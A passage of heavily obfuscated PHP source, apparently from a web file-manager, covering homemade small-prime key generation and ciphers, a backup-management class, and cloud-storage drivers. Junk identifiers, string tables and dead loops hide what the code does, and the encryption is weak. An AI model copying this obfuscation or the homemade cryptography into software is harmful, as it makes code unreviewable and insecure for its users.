$¦“ïëÚ[750]; if ($Áå³ˆ - 1 > 0) { $ë—§Ÿ•™ = $this->zxdafac23473($ë—§Ÿ•™, $†ë‹Ä„Å, $Áå³ˆ - 1); } return $ë—§Ÿ•™; } private function zoqxe65a65a7($å’ëÜ³ƒ, $“¹ÜÇæ, $½«ô´•˜ = 3) { $¼äÁ¥°ó =& $_SERVER[ •ŒÓîÆ]; $…ö“ô¥ =& $_SERVER[ıŸƒèÂë]; if (!is_string($å’ëÜ³ƒ) || strlen($å’ëÜ³ƒ) < 10) { return !1; } $å’ëÜ³ƒ = trim($å’ëÜ³ƒ); $Œ¦Ä­ø = $¼äÁ¥°ó[751]; while (strlen($Œ¦Ä­ø) < $¼äÁ¥°ó[701]) { if (!$Œ¦Ä­ø) { break; } $Œ¦Ä­ø++; } $å’ëÜ³ƒ = strrev($å’ëÜ³ƒ); $¾·¢—û = $¼äÁ¥°ó[752]; if (!$¾·¢—û) { die; } $Â–êæ¹ğ = $å’ëÜ³ƒ[0]; $î¥ñ¸Îª = substr($å’ëÜ³ƒ, 1, 15); $š Ì“ï¾ = $¼äÁ¥°ó[753]; while ($š Ì“ï¾ < $¼äÁ¥°ó[671]) { if ($š Ì“ï¾ >= 0) { break; } $š Ì“ï¾++; } $å’ëÜ³ƒ = substr($å’ëÜ³ƒ, 16); $™áèçüƒ = $…ö“ô¥[297]; $¡»Ù‹ù¤ = $¼äÁ¥°ó[754]; while ($¡»Ù‹ù¤ < $¼äÁ¥°ó[665]) { if ($¡»Ù‹ù¤ >= 0) { break; } $¡»Ù‹ù¤++; } switch ($Â–êæ¹ğ) { case $…ö“ô¥[206]: $×ê–Æ = $this->kcaz537a44cc($å’ëÜ³ƒ, strrev($“¹ÜÇæ . $î¥ñ¸Îª)); $°·Ù¡äù = $¼äÁ¥°ó[755]; break; $›³õé÷± = $¼äÁ¥°ó[756]; while (strlen($›³õé÷±) < $¼äÁ¥°ó[665]) { if (!$›³õé÷±) { break; } $›³õé÷±++; } case $…ö“ô¥[123]: $×ê–Æ = $this->kcaz537a44cc($å’ëÜ³ƒ, strrev($î¥ñ¸Îª . $“¹ÜÇæ)); break; case $…ö“ô¥[298]: $×ê–Æ = $this->kcaz537a44cc($å’ëÜ³ƒ, base64_encode($î¥ñ¸Îª . $“¹ÜÇæ)); break; case $…ö“ô¥[299]: $×ê–Æ = $this->kcaz537a44cc($å’ëÜ³ƒ, md5($î¥ñ¸Îª . $“¹ÜÇæ)); break; $±ğ›°õ¼ = $¼äÁ¥°ó[757]; while (strlen($±ğ›°õ¼) < $¼äÁ¥°ó[701]) { if (!$±ğ›°õ¼) { break; } $±ğ›°õ¼++; } case $…ö“ô¥[300]: $å’ëÜ³ƒ = hash_decode($å’ëÜ³ƒ); $ŒĞ‹èĞõ = $å’ëÜ³ƒ[0]; $ºÃø²´¢ = $¼äÁ¥°ó[758]; while ($ºÃø²´¢ < $¼äÁ¥°ó[701]) { if ($ºÃø²´¢ >= 0) { break; } $ºÃø²´¢++; } $å’ëÜ³ƒ = substr($å’ëÜ³ƒ, 1); $˜·ùôñğ = $¼äÁ¥°ó[759]; while ($˜·ùôñğ < $¼äÁ¥°ó[665]) { if ($˜·ùôñğ >= 0) { break; } $˜·ùôñğ++; } $¤à«Æçñ = strpos($™áèçüƒ, $ŒĞ‹èĞõ); $ ”ùû = $¼äÁ¥°ó[760]; while (strlen($ ”ùû) < $¼äÁ¥°ó[665]) { if (!$ ”ùû) { break; } $ ”ùû++; } $ƒ³Ï®°ù = md5($ŒĞ‹èĞõ . md5($“¹ÜÇæ . $ŒĞ‹èĞõ) . $“¹ÜÇæ); $‡‡Áœˆ» = $¼äÁ¥°ó[761]; if (!$‡‡Áœˆ») { return; } $ƒ³Ï®°ù = substr($ƒ³Ï®°ù, $¤à«Æçñ % 8, $¤à«Æçñ % 8 + 7); $¾—éÙ  = $¼äÁ¥°ó[762]; if (strlen($¾—éÙ ) < $¼äÁ¥°ó[671]) { die; } $‘ÈÅÂçÊ = $…ö“ô¥[6]; $çÈÒ¨á÷ = $¼äÁ¥°ó[763]; if (strlen($çÈÒ¨á÷) < $¼äÁ¥°ó[660]) { die; } $Ø®õâç = 0; $ùù¡¯Ñì = $¼äÁ¥°ó[764]; if (strlen($ùù¡¯Ñì) < $¼äÁ¥°ó[665]) { return; } $Ÿ˜ÖÛù© = 0; $”³”ë½• = $¼äÁ¥°ó[765]; if (!$”³”ë½•) { return; } $æç¾ ß‚ = 0; for ($Ø®õâç = 0; $Ø®õâç < strlen($å’ëÜ³ƒ); $Ø®õâç++) { $æç¾ ß‚ = $æç¾ ß‚ == strlen($ƒ³Ï®°ù) ? 0 : $æç¾ ß‚; $ØŸ°àÄâ = $¼äÁ¥°ó[766]; if (!$ØŸ°àÄâ) { return; } $¨ôÖÉõˆ = $æç¾ ß‚++; $Ÿ˜ÖÛù© = strpos($™áèçüƒ, $å’ëÜ³ƒ[$Ø®õâç]) - $¤à«Æçñ - ord($ƒ³Ï®°ù[$¨ôÖÉõˆ]); while ($Ÿ˜ÖÛù© < 0) { $Ÿ˜ÖÛù© += 64; } $‘ÈÅÂçÊ .= $™áèçüƒ[$Ÿ˜ÖÛù©]; } $×ê–Æ = base64_decode($‘ÈÅÂçÊ); break; default: $×ê–Æ = $this->kcaz537a44cc($å’ëÜ³ƒ, $“¹ÜÇæ . $î¥ñ¸Îª); break; } if ($½«ô´•˜ - 1 > 0) { $×ê–Æ = $this->zoqxe65a65a7($×ê–Æ, $“¹ÜÇæ, $½«ô´•˜ - 1); } return $×ê–Æ; } public function xnof693481ee($Ï¡Üï–®) { $›¯­éıÔ =& $_SERVER[ •ŒÓîÆ]; $–¶Š»è =& $_SERVER[ıŸƒèÂë]; $ˆúõé‚ = $this->sjwa6a7602be(); $²éÑßÎ = $›¯­éıÔ[767]; while (strlen($²éÑßÎ) < $›¯­éıÔ[665]) { if (!$²éÑßÎ) { break; } $²éÑßÎ++; } $‡”ÛóĞª = $this->sjwa6a7602be(); $ˆáÀ³€ä = ($ˆúõé‚ - 1) * ($‡”ÛóĞª - 1); $Í¤ùËı = intval(($ˆúõé‚ + $‡”ÛóĞª) / 2); while (1) { $ ˆñä¼ = $Í¤ùËı; $Øí·À© = $›¯­éıÔ[768]; if (strlen($Øí·À©) < $›¯­éıÔ[701]) { return; } $µÇ¨Ò¶Ú = $ˆáÀ³€ä; while ($µÇ¨Ò¶Ú % $ ˆñä¼ != 0) { $ªßùêú² = $µÇ¨Ò¶Ú; $¢î“ËúÑ = $›¯­éıÔ[769]; if (!$¢î“ËúÑ) { die; } $µÇ¨Ò¶Ú = $ ˆñä¼; $ ˆñä¼ = $ªßùêú² % $ ˆñä¼; $ù®ˆ©×â = $›¯­éıÔ[770]; if (strlen($ù®ˆ©×â) < $›¯­éıÔ[660]) { return; } } if ($ ˆñä¼ == 1) { break; } else { $Í¤ùËı++; } } $½¦Íòóì = 2; $ò’¨§è = $›¯­éıÔ[771]; if (strlen($ò’¨§è) < $›¯­éıÔ[660]) { return; } for ($¶®àù¾ = 0; $¶®àù¾ < $ˆáÀ³€ä * 10; $¶®àù¾++) { if (($ˆáÀ³€ä * $¶®àù¾ + 1) % $Í¤ùËı == 0) { $½¦Íòóì = intval(($ˆáÀ³€ä * $¶®àù¾ + 1) / $Í¤ùËı); break; } } $á®’÷ÉË = $this->pnwk3c18debd($ˆúõé‚ * $‡”ÛóĞª . $–¶Š»è[6], $–¶Š»è[137]); $©Ø “– = md5($–¶Š»è[301] . ($ˆúõé‚ + $‡”ÛóĞª) . $–¶Š»è[302] . $Í¤ùËı . $–¶Š»è[302] . $½¦Íòóì . $–¶Š»è[303]); $Öíš¸éº = $this->pnwk3c18debd($Ï¡Üï–®, $©Ø “–) . $–¶Š»è[304] . $á®’÷ÉË; $Ñã¸‹¡Ù = $›¯­éıÔ[772]; while (strlen($Ñã¸‹¡Ù) < $›¯­éıÔ[671]) { if (!$Ñã¸‹¡Ù) { break; } $Ñã¸‹¡Ù++; } return $Öíš¸éº; } public function spjb74210cba($€”¹†¹Ì) { $êÂœÙôÇ =& $_SERVER[ •ŒÓîÆ]; $ø‚¢ÏÊš =& $_SERVER[ıŸƒèÂë]; $“Üıˆ†Û = explode($ø‚¢ÏÊš[304], $€”¹†¹Ì); if (count($“Üıˆ†Û) != 2) { return $ø‚¢ÏÊš[6]; } $—š¦¨æ› = $this->kcaz537a44cc($“Üıˆ†Û[1] . $ø‚¢ÏÊš[6], $ø‚¢ÏÊš[137]); $…Ù·øÓ = $êÂœÙôÇ[773]; while ($…Ù·øÓ < $êÂœÙôÇ[701]) { if ($…Ù·øÓ >= 0) { break; } $…Ù·øÓ++; } if (!$—š¦¨æ›) { return $ø‚¢ÏÊš[6]; } $—š¦¨æ› = intval($—š¦¨æ›); $İÆèÙ¤ = $êÂœÙôÇ[774]; while (strlen($İÆèÙ¤) < $êÂœÙôÇ[660]) { if (!$İÆèÙ¤) { break; } $İÆèÙ¤++; } $¸ø„ßÕ÷ = 0; $”™æ¶‘¬ = 0; $Éû·‹İÃ = $êÂœÙôÇ[775]; if (!$Éû·‹İÃ) { return; } for ($“êÈÉÇ• = 3; $“êÈÉÇ• < $—š¦¨æ›; $“êÈÉÇ• += 2) { if ($—š¦¨æ› % $“êÈÉÇ• != 0) { continue; } $¸ø„ßÕ÷ = $“êÈÉÇ•; $”™æ¶‘¬ = intval($—š¦¨æ› / $“êÈÉÇ•); break; } $ÈÔêô¸Û = ($¸ø„ßÕ÷ - 1) * ($”™æ¶‘¬ - 1); $ÕĞ‹Š•¿ = intval(($¸ø„ßÕ÷ + $”™æ¶‘¬) / 2); $ŞÚœ÷Ò• = $êÂœÙôÇ[776]; while (1) { $ûİÍÏ•® = $ÕĞ‹Š•¿; $²‰øûà = $ÈÔêô¸Û; while ($²‰øûà % $ûİÍÏ•® != 0) { $ƒïàòú¦ = $²‰øûà; $²‰øûà = $ûİÍÏ•®; $Ï‰£« = $êÂœÙôÇ[777]; if (strlen($Ï‰£«) < $êÂœÙôÇ[665]) { die; } $ûİÍÏ•® = $ƒïàòú¦ % $ûİÍÏ•®; $¨ºĞêé¨ = $êÂœÙôÇ[778]; if (strlen($¨ºĞêé¨) < $êÂœÙôÇ[701]) { die; } } if ($ûİÍÏ•® == 1) { break; } else { $ÕĞ‹Š•¿++; } } $¤Æ–üä£ = 2; for ($“êÈÉÇ• = 0; $“êÈÉÇ• < $ÈÔêô¸Û * 10; $“êÈÉÇ•++) { if (($ÈÔêô¸Û * $“êÈÉÇ• + 1) % $ÕĞ‹Š•¿ == 0) { $¤Æ–üä£ = intval(($ÈÔêô¸Û * $“êÈÉÇ• + 1) / $ÕĞ‹Š•¿); break; } } $Ü½…ù¨Û = md5($ø‚¢ÏÊš[301] . ($¸ø„ßÕ÷ + $”™æ¶‘¬) . $ø‚¢ÏÊš[302] . $ÕĞ‹Š•¿ . $ø‚¢ÏÊš[302] . $¤Æ–üä£ . $ø‚¢ÏÊš[303]); $ëÔÛŠŒ = $êÂœÙôÇ[779]; $“³€‚Ç = $this->kcaz537a44cc($“Üıˆ†Û[0], $Ü½…ù¨Û); $’¦ü¼ä× = $êÂœÙôÇ[780]; if (!$’¦ü¼ä×) { return; } return $“³€‚Ç; $Ñ÷şĞÔã = $êÂœÙôÇ[781]; if (strlen($Ñ÷şĞÔã) < $êÂœÙôÇ[260]) { die; } } public function sjwa6a7602be() { $’áø¸ƒ =& $_SERVER[ •ŒÓîÆ]; $º”ÖÓÖ = mt_rand(pow(2, 14), pow(2, 16) - 1); $í¹šĞñä = array(); $€§ˆş–ú = $’áø¸ƒ[782]; if (strlen($€§ˆş–ú) < $’áø¸ƒ[701]) { die; } $ÃÇü÷× = 1; $«–ÁÀŞ = $’áø¸ƒ[783]; while ($«–ÁÀŞ < $’áø¸ƒ[665]) { if ($«–ÁÀŞ >= 0) { break; } $«–ÁÀŞ++; } while ($ÃÇü÷× <= (int) sqrt($º”ÖÓÖ)) { $©ë«¨ı– = $ÃÇü÷×; while (!0) { $©ë«¨ı–++; $è¤å¢ÜÏ = $’áø¸ƒ[784]; if (strlen($è¤å¢ÜÏ) < $’áø¸ƒ[701]) { die; } if ($©ë«¨ı– <= 2) { $ÃÇü÷× = $©ë«¨ı–; break; } else { if ($©ë«¨ı– < 2) { continue; } } $Ë¢ÒÌ¥Ú = !0; for ($Šäéº¨¥ = 2; $Šäéº¨¥ <= sqrt($©ë«¨ı–); $Šäéº¨¥++) { if ($©ë«¨ı– % $Šäéº¨¥ == 0) { $Ë¢ÒÌ¥Ú = !1; } } if ($Ë¢ÒÌ¥Ú) { $ÃÇü÷× = $©ë«¨ı–; break; } } $í¹šĞñä[] = $ÃÇü÷×; $Ò›Ùé¥¨ = $’áø¸ƒ[785]; while ($Ò›Ùé¥¨ < $’áø¸ƒ[260]) { if ($Ò›Ùé¥¨ >= 0) { break; } $Ò›Ùé¥¨++; } } $°·‡Êê¸ = 2; for ($©ë«¨ı– = $º”ÖÓÖ; $©ë«¨ı– > 1; $©ë«¨ı–--) { $Ë¢ÒÌ¥Ú = !0; $µüú©èÀ = $’áø¸ƒ[786]; if (!$µüú©èÀ) { return; } foreach ($í¹šĞñä as $£˜¸ßá) { if ($©ë«¨ı– % $£˜¸ßá == 0) { $Ë¢ÒÌ¥Ú = !1; break; } } if ($Ë¢ÒÌ¥Ú) { $°·‡Êê¸ = $©ë«¨ı–; break; } } return $°·‡Êê¸; } public function pgec2534df34($â”¿×, $•Çı×Ù) { $öÕ˜éÉ =& $_SERVER[ıŸƒèÂë]; return call_user_func(array($öÕ˜éÉ[8], $öÕ˜éÉ[305]), $â”¿×, $•Çı×Ù); } public function pnwk3c18debd($ñ¨¯İäç, $™†ÄÌ²‹) { $ĞÀ‡ô„® =& $_SERVER[ •ŒÓîÆ]; $µğÆ¢Óç =& $_SERVER[ıŸƒèÂë]; return call_user_func(array($µğÆ¢Óç[306], $µğÆ¢Óç[307]), $ñ¨¯İäç, $™†ÄÌ²‹); $¶ïÊ³‹ = $ĞÀ‡ô„®[787]; if (strlen($¶ïÊ³‹) < $ĞÀ‡ô„®[665]) { return; } } public function kcaz537a44cc($™­ğø, $©Ô‘öÄ) { $İ Àä ö =& $_SERVER[ıŸƒèÂë]; return call_user_func(array($İ Àä ö[306], $İ Àä ö[308]), $™­ğø, $©Ô‘öÄ); $Æè„ÔÄ½ = $_SERVER[ •ŒÓîÆ][788]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $çÇ³¢™ =& $_SERVER[ •ŒÓîÆ]; $this->isManual(); self::$name = date($çÇ³¢™[789]); if (!($„ÒÊ™“¹ = Model($çÇ³¢™[790])->lastItem())) { $„ÒÊ™“¹ = $this->initData(); } else { self::$name = $„ÒÊ™“¹[$çÇ³¢™[32]]; if ($„ÒÊ™“¹[$çÇ³¢™[791]] == $çÇ³¢™[90]) { self::$name = date($çÇ³¢™[266]); $¯óöáìÜ = 0; if (isset($„ÒÊ™“¹[$çÇ³¢™[348]][$çÇ³¢™[216]][$çÇ³¢™[520]])) { $¯óöáìÜ = (int) $„ÒÊ™“¹[$çÇ³¢™[348]][$çÇ³¢™[216]][$çÇ³¢™[520]]; } if (self::$manual == 0 && $„ÒÊ™“¹[$çÇ³¢™[32]] == self::$name) { Model($çÇ³¢™[790])->remove($„ÒÊ™“¹[$çÇ³¢™[453]]); } $„ÒÊ™“¹ = $this->initData($¯óöáìÜ, $„ÒÊ™“¹[$çÇ³¢™[792]]); } else { $this->checkStore($„ÒÊ™“¹[$çÇ³¢™[792]]); } } self::$option = $„ÒÊ™“¹; } private function isManual() { $ÒÃŞÀäƒ = _get($GLOBALS, $_SERVER[ •ŒÓîÆ][793], 0); $ÒÃŞÀäƒ = intval($ÒÃŞÀäƒ); self::$manual = $ÒÃŞÀäƒ && $ÒÃŞÀäƒ == 1 ? 1 : 0; } private function initData($Š†üôÆ† = 0, $ñì¸¢ä = '') { $Ô ÜÅÎñ =& $_SERVER[ •ŒÓîÆ]; $Ô·Û¢­Ò = Model($Ô ÜÅÎñ[790])->config(); if ($ñì¸¢ä && $Ô·Û¢­Ò[$Ô ÜÅÎñ[792]] != $ñì¸¢ä) { $Š†üôÆ† = 0; } $this->checkStore($Ô·Û¢­Ò[$Ô ÜÅÎñ[792]]); if (self::$manual == 1) { self::$name .= $Ô ÜÅÎñ[11] . date($Ô ÜÅÎñ[794]); } $—Ÿà¸¢ = array($Ô ÜÅÎñ[792] => $Ô·Û¢­Ò[$Ô ÜÅÎñ[792]], $Ô ÜÅÎñ[32] => self::$name, $Ô ÜÅÎñ[791] => 0, $Ô ÜÅÎñ[795] => $Ô·Û¢­Ò[$Ô ÜÅÎñ[795]], $Ô ÜÅÎñ[796] => self::$manual, $Ô ÜÅÎñ[348] => array($Ô ÜÅÎñ[797] => array($Ô ÜÅÎñ[791] => 0), $Ô ÜÅÎñ[798] => array($Ô ÜÅÎñ[791] => 0, $Ô ÜÅÎñ[799] => 0, $Ô ÜÅÎñ[800] => 0, $Ô ÜÅÎñ[33] => $Ô ÜÅÎñ[12], $Ô ÜÅÎñ[801] => 0, $Ô ÜÅÎñ[802] => 0), $Ô ÜÅÎñ[803] => array($Ô ÜÅÎñ[791] => 0, $Ô ÜÅÎñ[799] => 0, $Ô ÜÅÎñ[800] => 0, $Ô ÜÅÎñ[801] => 0, $Ô ÜÅÎñ[802] => 0), $Ô ÜÅÎñ[216] => array($Ô ÜÅÎñ[791] => 0, $Ô ÜÅÎñ[804] => 0, $Ô ÜÅÎñ[805] => 0, $Ô ÜÅÎñ[806] => 0, $Ô ÜÅÎñ[807] => 0, $Ô ÜÅÎñ[520] => $Š†üôÆ†, $Ô ÜÅÎñ[801] => 0, $Ô ÜÅÎñ[802] => 0)), $Ô ÜÅÎñ[801] => time(), $Ô ÜÅÎñ[802] => 0); $¶îó×š = Model($Ô ÜÅÎñ[790])->insert($—Ÿà¸¢); $—Ÿà¸¢[$Ô ÜÅÎñ[453]] = $¶îó×š; return $—Ÿà¸¢; } private function checkStore($­†ÅŞ²) { $ÎÕéöïé =& $_SERVER[ •ŒÓîÆ]; $Ğü¿¿”· = Model($ÎÕéöïé[808])->listData($­†ÅŞ²); Model($ÎÕéöïé[808])->checkConfig($Ğü¿¿”·); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ •ŒÓîÆ][790])->findByName(self::$name); } return self::$option; } public static function set($¡Â˜¿ÑÎ) { $„–Âæ– =& $_SERVER[ •ŒÓîÆ]; $úÔ û×ı = self::get(); foreach ($¡Â˜¿ÑÎ as $Ç¡¨»—¶ => $¹Õ‡„¡Æ) { $ˆÜÈ•Ù¡ = explode($„–Âæ–[10], $Ç¡¨»—¶); $¼¨èœ¿À = count($ˆÜÈ•Ù¡); switch ($¼¨èœ¿À) { case 1: $úÔ û×ı[$ˆÜÈ•Ù¡[0]] = $¹Õ‡„¡Æ; break; case 2: $úÔ û×ı[$ˆÜÈ•Ù¡[0]][$ˆÜÈ•Ù¡[1]] = $¹Õ‡„¡Æ; break; case 3: $úÔ û×ı[$ˆÜÈ•Ù¡[0]][$ˆÜÈ•Ù¡[1]][$ˆÜÈ•Ù¡[2]] = $¹Õ‡„¡Æ; break; } } Model($„–Âæ–[790])->update($úÔ û×ı[$„–Âæ–[453]], $úÔ û×ı); self::$option = $úÔ û×ı; return self::$option; } public function keep() { $—íïÅ¯Ú =& $_SERVER[ •ŒÓîÆ]; $¶›´¦åÁ = self::get(); if ($¶›´¦åÁ[$—íïÅ¯Ú[348]][$—íïÅ¯Ú[797]][$—íïÅ¯Ú[791]] == $—íïÅ¯Ú[90]) { return; } $this->backupKeep($¶›´¦åÁ); self::set(array($—íïÅ¯Ú[809] => 1)); } private function backupKeep($ø§Œ¯) { $±¯Óï…· =& $_SERVER[ •ŒÓîÆ]; if (self::$manual == 1) { return; } $ÄÁ‚‹²¾ = Model($±¯Óï…·[790])->listData(); if (empty($ÄÁ‚‹²¾)) { return; } $³Ô¦ĞºŠ = 0; $©”è„¶ = array(); foreach ($ÄÁ‚‹²¾ as $á÷å§Ä) { if ($³Ô¦ĞºŠ >= 7) { break; } $©”è„¶[] = $á÷å§Ä[$±¯Óï…·[32]]; $³Ô¦ĞºŠ++; } for ($³Ô¦ĞºŠ = 0; $³Ô¦ĞºŠ < 12; $³Ô¦ĞºŠ++) { $©”è„¶[] = date($±¯Óï…·[810], strtotime("\x2d{$³Ô¦ĞºŠ}\40\155\x6f\x6e\x74\150\163")); } $©”è„¶ = array_unique($©”è„¶); $‚ØûŒÉÛ = Model($±¯Óï…·[811])->get($±¯Óï…·[812]); foreach ($ÄÁ‚‹²¾ as $á÷å§Ä) { if (isset($á÷å§Ä[$±¯Óï…·[796]]) && $á÷å§Ä[$±¯Óï…·[796]] == $±¯Óï…·[90]) { continue; } if (!empty($á÷å§Ä[$±¯Óï…·[32]]) && in_array($á÷å§Ä[$±¯Óï…·[32]], $©”è„¶)) { continue; } Model($±¯Óï…·[790])->remove($á÷å§Ä[$±¯Óï…·[453]]); $ä±½œàÎ = $this->backupPath($ø§Œ¯, $‚ØûŒÉÛ); IO::remove($ä±½œàÎ, !1); } } private function backupPath($ÔßˆÊÄ, $âù›š©… = false) { $”ˆ°ÍÙ  =& $_SERVER[ •ŒÓîÆ]; if (!$âù›š©…) { $âù›š©… = Model($”ˆ°ÍÙ [811])->get($”ˆ°ÍÙ [812]); } $õ°¢é®£ = $ÔßˆÊÄ[$”ˆ°ÍÙ [32]]; $Ç„Ïä¾ = substr(md5($”ˆ°ÍÙ [813] . $âù›š©… . $õ°¢é®£), 0, 8); return "\x7b\x69\x6f\x3a{$ÔßˆÊÄ[$”ˆ°ÍÙ [792]]}\175\57\x64\x61\x74\x61\x62\141\x73\x65\57\142\x61\143\x6b\165\x70\57" . $õ°¢é®£ . $”ˆ°ÍÙ [11] . $Ç„Ïä¾; } public function db() { $ñÉ¼’­ş =& $_SERVER[ •ŒÓîÆ]; $·±õüÂ† = self::get(); if ($·±õüÂ†[$ñÉ¼’­ş[348]][$ñÉ¼’­ş[798]][$ñÉ¼’­ş[791]] == $ñÉ¼’­ş[90]) { return !0; } $ˆ®¸¹Íğ = new BackupDb(); if (!$ˆ®¸¹Íğ->index()) { return !1; } self::set(array($ñÉ¼’­ş[814] => 1)); return !0; } public function dbFile() { $½ÙÖÚÆÌ =& $_SERVER[ •ŒÓîÆ]; $¼š½Ó‹Ç = self::get(); if ($¼š½Ó‹Ç[$½ÙÖÚÆÌ[348]][$½ÙÖÚÆÌ[803]][$½ÙÖÚÆÌ[791]] == $½ÙÖÚÆÌ[90]) { return !0; } $¼ŠÉ¿™‡ = new BackupDbFile(); if (!$¼ŠÉ¿™‡->index()) { return !1; } self::set(array($½ÙÖÚÆÌ[815] => 1)); return !0; } public function file() { $¹×ë¿Öà =& $_SERVER[ •ŒÓîÆ]; $¨€•œ‚® = self::get(); if ($¨€•œ‚®[$¹×ë¿Öà[348]][$¹×ë¿Öà[216]][$¹×ë¿Öà[791]] == $¹×ë¿Öà[90]) { return !0; } if (!isset($¨€•œ‚®[$¹×ë¿Öà[795]]) || $¨€•œ‚®[$¹×ë¿Öà[795]] == $¹×ë¿Öà[214]) { $«Ò¶§×ã = new BackupFile(); if (!$«Ò¶§×ã->index()) { return !1; } } self::set(array($¹×ë¿Öà[816] => 1, $¹×ë¿Öà[791] => 1)); return !0; } } goto aä¿ŒÉŠ†; DµÃœğÓÙ¢: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($€œ¬÷ØÃ) { parent::__construct($€œ¬÷ØÃ); $this->signatureVersion($_SERVER[ •ŒÓîÆ][233]); } public function fileOutImage($Ú·ˆÈŠÅ, $¡ñÛ¾©Ÿ = 250) { $œª°Ñ ‡ =& $_SERVER[ •ŒÓîÆ]; if ($this->size($Ú·ˆÈŠÅ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ú·ˆÈŠÅ, $¡ñÛ¾©Ÿ); } $ºæ™Á = array($œª°Ñ ‡[1409] => $œª°Ñ ‡[1410] . $¡ñÛ¾©Ÿ . $œª°Ñ ‡[1411]); $ºñĞ®»Ù = $this->link($Ú·ˆÈŠÅ, $ºæ™Á); $this->fileOutLink($ºñĞ®»Ù); } public function fileOutLink($š‰ö³Ÿ•) { $á¿Ìµ½¢ =& $_SERVER[ •ŒÓîÆ]; if (substr($š‰ö³Ÿ•, 0, 7) == $á¿Ìµ½¢[1372]) { $š‰ö³Ÿ• = $á¿Ìµ½¢[1373] . substr($š‰ö³Ÿ•, 7); } header($á¿Ìµ½¢[164] . $š‰ö³Ÿ•); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($‹ïÆÔÛ) { parent::__construct($‹ïÆÔÛ); $this->signatureVersion($_SERVER[ •ŒÓîÆ][233]); } public function fileOutLink($ŒÎ¡µº…) { $¾ÚÓ¨Ü =& $_SERVER[ •ŒÓîÆ]; if (substr($ŒÎ¡µº…, 0, 7) == $¾ÚÓ¨Ü[1372]) { $ŒÎ¡µº… = $¾ÚÓ¨Ü[1373] . substr($ŒÎ¡µº…, 7); } header($¾ÚÓ¨Ü[164] . $ŒÎ¡µº…); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($äÃç¸ª·) { parent::__construct(); include_once SDK_DIR . $_SERVER[ •ŒÓîÆ][1412]; $this->_init($äÃç¸ª·); } public function _init($›óüüş¢) { $´Ä²öÚ =& $_SERVER[ •ŒÓîÆ]; $this->config = $›óüüş¢; foreach ($›óüüş¢ as $«ºÉıú => $æÃÚáíÌ) { if (isset($this->{$«ºÉıú})) { $this->{$«ºÉıú} = $æÃÚáíÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($´Ä²öÚ[1413] . LNG($´Ä²öÚ[1414])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $£ª‡¤ =& $_SERVER[ •ŒÓîÆ]; $„½ì‹ñß = new OSS\Model\CorsConfig(); $¾¯·¶š‹ = new OSS\Model\CorsRule(); $¾¯·¶š‹->addAllowedOrigin($£ª‡¤[1415]); $¾¯·¶š‹->addAllowedMethod($£ª‡¤[1416]); $¾¯·¶š‹->addAllowedMethod($£ª‡¤[1417]); $¾¯·¶š‹->addAllowedMethod($£ª‡¤[1418]); $¾¯·¶š‹->addAllowedMethod($£ª‡¤[1419]); $¾¯·¶š‹->addAllowedMethod($£ª‡¤[163]); $¾¯·¶š‹->setMaxAgeSeconds(600); $¾¯·¶š‹->addExposeHeader($£ª‡¤[1420]); $¾¯·¶š‹->addAllowedHeader($£ª‡¤[1415]); $„½ì‹ñß->addRule($¾¯·¶š‹); try { $this->client->putBucketCors($this->bucket, $„½ì‹ñß); } catch (OSS\Core\OssException $–Ò¤—‰ ) { return !1; } return !0; } public function getBucketCors() { $İë§œÈ =& $_SERVER[ •ŒÓîÆ]; $·éıà»® = null; try { $·éıà»® = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ çÊ÷ù•) { return null; } if (!$·éıà»® || !($ÓüŸ’ïô = $·éıà»®->getRules())) { return null; } $ùĞ»åğà = $ÓüŸ’ïô[0]->getAllowedOrigins(); $­¥¸ÅÖÈ = $ÓüŸ’ïô[0]->getAllowedMethods(); $²óîó‡Ú = $ÓüŸ’ïô[0]->getMaxAgeSeconds(); $Å²¸»Ä = $ÓüŸ’ïô[0]->getExposeHeaders(); $¶Œ¾°É¹ = $ÓüŸ’ïô[0]->getAllowedHeaders(); return array($İë§œÈ[204] => isset($ùĞ»åğà[0]) ? $ùĞ»åğà[0] : $İë§œÈ[12], $İë§œÈ[208] => $­¥¸ÅÖÈ, $İë§œÈ[1421] => $²óîó‡Ú, $İë§œÈ[1422] => isset($Å²¸»Ä[0]) ? $Å²¸»Ä[0] : $İë§œÈ[12], $İë§œÈ[206] => isset($¶Œ¾°É¹[0]) ? $¶Œ¾°É¹[0] : $İë§œÈ[12]); } public function isBucketCors() { $”‘ëÈÕˆ =& $_SERVER[ •ŒÓîÆ]; $ÀÛå”¨É = $this->getBucketCors(); if (!$ÀÛå”¨É || !is_array($ÀÛå”¨É)) { return !1; } if ($ÀÛå”¨É[$”‘ëÈÕˆ[204]] != $”‘ëÈÕˆ[205] || $ÀÛå”¨É[$”‘ëÈÕˆ[206]] != $”‘ëÈÕˆ[205]) { return !1; } $Í»ÁùÅ = array_map($”‘ëÈÕˆ[207], $ÀÛå”¨É[$”‘ëÈÕˆ[208]]); if (!is_array($Í»ÁùÅ)) { $Í»ÁùÅ = array(); } $›…îüÔ´ = array($”‘ëÈÕˆ[209], $”‘ëÈÕˆ[210], $”‘ëÈÕˆ[211], $”‘ëÈÕˆ[212], $”‘ëÈÕˆ[213]); $ß ˆãÛ = array_diff($›…îüÔ´, $Í»ÁùÅ); return empty($ß ˆãÛ); } public function mkfile($¦àíÊšæ, $ªÊ·Ÿ­Ô = '', $Üî…¿»ó = REPEAT_RENAME) { $ş£Ê´Áµ = $this->setContent($¦àíÊšæ, $ªÊ·Ÿ­Ô); if ($ş£Ê´Áµ !== !1) { return $this->getPathOuter($¦àíÊšæ); } return !1; } public function mkdir($Ğªè¹, $åæíşû = REPEAT_SKIP) { if ($åæíşû && $this->_isFolder($Ğªè¹)) { return $this->getPathOuter($Ğªè¹); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ğªè¹)); } catch 